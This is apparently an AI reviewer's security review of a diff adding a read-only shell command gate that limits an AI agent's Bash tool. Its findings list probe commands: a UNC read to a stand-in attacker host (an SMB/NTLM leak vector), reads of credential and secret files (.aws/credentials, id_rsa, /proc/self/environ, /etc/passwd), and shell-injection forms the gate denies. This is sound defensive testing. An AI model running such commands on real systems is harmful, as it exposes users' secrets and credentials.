# #308 story E0 (#408) app-security review (Horus) - 2026-10-05

[app-security-reviewer] CRITICAL tier. ADR cache HIT (38 ADRs); no applicable security ADR violated by the diff.
Scope: `git diff 6f78aee 77a5b82` (readonly-catalog.ts, shell.ts call site, shipped-defaults.json + K proposed-settings rule). Probes ran through the real copied hook (createGateSandbox, empty rules) and `normalize()` in my own detached worktree (removed).

## Verdict: APPROVE-WITH-CONDITIONS
The shell grammar is closed and I could not break it. The one real gap (reads of secrets / out-of-repo / UNC) is the already-disclosed #435; acceptable for E0 only because the gate is unwired (exposure 0 until K) and #435 is tied to K activation. Condition: #435 stays a hard precondition of K and its scope is widened (below).

## Findings (ranked)
1. [MED][demonstrated] UNC path `cat //attacker/share/x` / `ls //attacker/share` is allowed and canonicalised to `/attacker/share/x` (the leading `//` is lost), so no future read-deny rule written for UNC could match, and on Windows Git Bash the read triggers SMB auth to an attacker host (NTLM leak vector). Raw: `ALLOW "cat //attacker/share/x"`; target `["/attacker/share/x"]`, unresolved `[]`. Cause: BARE_WORD admits `/`; `pathFormIssue` only flags `:`. Minimal fix: in resolveReadOnly (or isBarePath) mark operands starting `//` (or `\`) unresolved. Exposure: 0% of live requests today (gate unwired), basis: counted in code. Issue filed.
2. [MED][demonstrated] #435 scope: reads allowed, not just `.env`: `cat ../.env`, `cat ../../../etc/passwd`, `cat /home/u/.aws/credentials`, `cat /proc/self/environ`, `cat /c/Users/<user>/.ssh/id_rsa`, `grep -r AKIA /`, `ls -R /`, `cat /dev/zero` all return a clean read/list record with no unresolved cause. Shipped rules contain zero read/list denies (only `tool-class:read-only` allow + write-verb protects). Traversal is collapsed correctly (`.thoth/../.env` -> `.env`, `.ENV` -> `.env`, `.env.` -> `.env`), so a read-deny rule CAN match once written. Judgment: not a blocker for E0 (unwired gate, disclosed, #435 open under S7/pol); tracked there, so no new Issue; fold these forms into #435's acceptance test (out-of-repo absolute, `..` escape, /proc, /dev, drive-letter forms). Exposure: 0% today, basis: counted in code.
3. [LOW][code-traced] `src/policy/normalizer/structured-cluster.ts` has neither a protect rule nor a K Edit deny while its 11 siblings do (counted by loop: rule=0 settings=0). Pre-existing, not E0; confirm it is outside the hook import graph.
4. [CLEAN][demonstrated] Grammar injection: `;`, `&&`, `|`, `$()`, backticks, `<()`, redirects, heredocs, env prefixes, wrappers, quoted/escaped binary names, `--`, long flags, `-f`/`-e` file-sourcing flags all denied (shared corpus through real hook; plus my probes `cat -- x`, `ls -la -- x`, `grep -e x -e y f`, `head -n 99999999` denied). BARE_WORD excludes `* ? [ ] $ ~ \ " ' ` space, so no globbing/expansion; grep patterns only single-quoted printable ASCII (inert).
5. [CLEAN][code-traced] Multi-target cap (>=2 operands unresolved) and depth-0/no-wrapper guard hold; hook is Bash-only (no PowerShell matcher), so PowerShell `cat a,b` array semantics do not apply.
6. [CLEAN][demonstrated] Generated deny rule: `protect-src-policy-normalizer-readonly-catalog-ts` is byte-shape identical to siblings (mandatory, 6 write verbs, correct target); K settings gets `Edit(/src/policy/normalizer/readonly-catalog.ts)`. Loop over normalizer/*.ts: readonly-catalog.ts rule=1 settings=1. Diff on shipped-defaults.json is 17 insertions, 1 file, nothing else changed.

## Blockers vs hardening
Blockers: none. Hardening/conditions: (1) fix or ticket UNC handling before K; (2) #435 is a K-activation gate and covers findings 2's path forms.

## Next action
Add the `//` unresolved check (finding 1) with a failing test in readonly-catalog.test.ts, and extend #435's acceptance list.

Open findings: 2 (both MED, 0 blocking). Failing tests: 0 written by me (findings 1-2 have executable form: `cat //h/s/x` must be unresolved; read-deny rule tests under #435). Counts differ because I did not author tests; named here for the implementer.

RECEIPT: verdict=APPROVE-WITH-CONDITIONS
findings:
1. [ISSUE][MED][demonstrated] readonly-catalog.ts BARE_WORD / shell.ts resolveReadOnly: `cat //host/share/x` allowed, canonicalised to `/host/share/x` (UNC lost, SMB auth vector); mark `//`-leading operands unresolved
2. [ISSUE][MED][demonstrated] shipped-defaults.json has no read-deny: `..` escape, absolute out-of-repo, /proc/self/environ, ~/.ssh via drive path, `grep -r /` all allowed; = #435, not blocking E0 (gate unwired), widen #435 scope
3. [SUSPICION][LOW][code-traced] structured-cluster.ts has no protect rule/K Edit deny unlike 11 siblings; confirm outside hook import graph
4. [CLEAN][demonstrated] shell grammar injection/globbing/redirect/wrapper/flag-smuggling all denied via real hook
5. [CLEAN][code-traced] #82 cap, depth-0/no-wrapper guard, Bash-only hook
6. [CLEAN][demonstrated] generated deny rule + K settings entry correct and consistent with siblings
counts: issues=2 suspicions=1 clean=3
evidence: demonstrated=4 code-traced=2 derived=0
checks="1/0/0 (probe run, 29 commands, 0 failed; E0 suites not re-run)"
adr=HIT(38)
report=docs/reviews/s308-E0-app-security-2026-10-05.md
